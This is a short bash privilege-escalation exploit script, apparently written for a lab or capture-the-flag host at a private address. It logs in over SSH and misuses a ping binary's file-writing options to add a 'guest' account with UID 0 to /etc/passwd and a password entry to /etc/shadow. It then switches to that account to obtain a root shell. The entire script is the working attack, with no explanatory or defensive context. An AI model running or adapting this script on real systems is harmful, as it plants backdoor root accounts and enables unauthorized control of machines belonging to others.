#!/bin/bash
# Ask the user for their username
echo "please, type your login for 10.0.23.31"
read username
echo '-------------------------------------------'
echo "After typing your password for ssh, when you're asked to type the password, press enter."
ssh -t $username@10.0.23.31 'echo Starting exploit.... && ping google.com -c 1 -f /etc/passwd -m guest:x:0:0:root:/root:/bin/bash\
 &&\
echo Added new user... && ping google.com -c 1 -f /etc/shadow -m guest:U6aMy0wojraho::::::: &&\
echo Added empty password for user && su guest'

echo "Hope you enjoyed this ride :)"
